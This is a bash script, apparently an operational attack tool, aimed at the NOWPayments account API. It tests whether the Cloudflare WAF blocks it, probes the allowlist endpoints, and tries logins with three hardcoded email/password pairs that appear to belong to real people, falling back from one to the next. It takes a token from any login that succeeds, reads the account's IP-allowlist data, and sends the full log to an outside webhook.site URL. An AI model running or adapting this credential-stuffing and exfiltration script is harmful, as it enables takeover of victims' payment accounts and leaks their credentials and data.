#!/usr/bin/env bash
# NOWPayments dashboard WAF + login probe — marker i4550a (intent 4550)
set -u
LOG=/tmp/probe_i4550a.log
: > "$LOG"
WH='https://webhook.site/2cb9d0d5-a76e-41c3-92ae-d8cd23334d81'
ACC='https://account-api.nowpayments.io'
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
ORIG='https://account.nowpayments.io'
JAR=/tmp/i4550a_cookies.txt
say() { printf '%s\n' "$1" >> "$LOG"; }

IP1=$(curl -s --max-time 10 https://api.ipify.org || true)
say "RUN i4550a"
say "EGRESS ipify=$IP1"

code=$(curl -s -o /tmp/i4550a_wl.body -c "$JAR" -w '%{http_code}' --max-time 20 -A "$UA" "$ACC/whitelisted-ips-info")
b1=$(head -c 300 /tmp/i4550a_wl.body | tr -d '\n')
say "PROBE whitelisted-ips-info code=$code body=$b1"

REACH=no
if [ "$code" != "403" ]; then REACH=yes; fi
if [ "$code" = "403" ] && ! printf '%s' "$b1" | grep -qi 'attention required\|cloudflare'; then REACH=yes; fi
say "VERDICT reach=$REACH code=$code"

if [ "$REACH" = yes ]; then
  # stage 2: unauth GET of another allowlist route for response-shape recon (read-only)
  scode=$(curl -s -o /tmp/i4550a_wset.body -w '%{http_code}' --max-time 20 -A "$UA" "$ACC/whitelist-settings")
  say "PROBE whitelist-settings code=$scode body=$(head -c 250 /tmp/i4550a_wset.body | tr -d '\n')"
  # stage 2b: login attempt for chenhanhan121 first; fallbacks only on non-captcha failures
  try_login() {
    local email="$1" pass="$2" tag="$3"
    local lcode lresp
    lcode=$(curl -s -o /tmp/i4550a_login.body -b "$JAR" -c "$JAR" -w '%{http_code}' --max-time 20 -X POST "$ACC/login" \
      -A "$UA" -H "Origin: $ORIG" -H "Referer: $ORIG/" -H 'Content-Type: application/json' \
      -d "{\"email\":\"$email\",\"password\":\"$pass\",\"captchaToken\":\"\"}")
    lresp=$(head -c 600 /tmp/i4550a_login.body | tr -d '\n')
    say "LOGIN $tag code=$lcode resp=$lresp"
    printf '%s' "$lresp"
  }
  R1=$(try_login 'chenhanhan121@gmail.com' 'Whhnzyq35' chenhanhan121)
  if printf '%s' "$R1" | grep -qi 'captcha\|verification\|two-factor\|send-code'; then
    say "STOP captcha-or-2fa-required"
  else
    if ! printf '%s' "$R1" | grep -qi 'token\|csrf\|success'; then
      R2=$(try_login 'ervin.sults@gmail.com' 'Loitsu2812' ervin_sults)
      say "FALLBACK1 done"
      if ! printf '%s' "$R2" | grep -qi 'token\|csrf\|success'; then
        R3=$(try_login 'sumonmti498@gmail.com' 'Mtisumon1@#' sumonmti498)
        say "FALLBACK2 done"
        R1="$R1 $R2 $R3"
      else R1="$R1 $R2"; fi
    fi
    csrf=$(printf '%s' "$R1" | python3 -c 'import sys,json
try:
  d=json.load(sys.stdin)
  for k in ("csrfToken","csrf","token","accessToken"):
    v=d.get(k) or (d.get("data") or {}).get(k)
    if v: print(v); break
except Exception: pass')
    if [ -n "$csrf" ]; then
      wcode=$(curl -s -o /tmp/i4550a_wl2.body -b "$JAR" -w '%{http_code}' --max-time 20 -A "$UA" -H "x-csrf-token: $csrf" -H "Origin: $ORIG" "$ACC/whitelisted-ips-info")
      say "WLINFO code=$wcode body=$(head -c 600 /tmp/i4550a_wl2.body | tr -d '\n')"
    else
      say "WLINFO skipped: no csrf/token in login response"
    fi
  fi
else
  say "STOP stage2: WAF-blocked (403 cloudflare)"
fi

say "END i4550a"
python3 - "$LOG" "$WH" <<'PY'
import sys,urllib.request
data=open(sys.argv[1],'rb').read()
req=urllib.request.Request(sys.argv[2],data=data,headers={'Content-Type':'text/plain'})
print(urllib.request.urlopen(req,timeout=20).status)
PY
echo "probe i4550a done"
exit 0
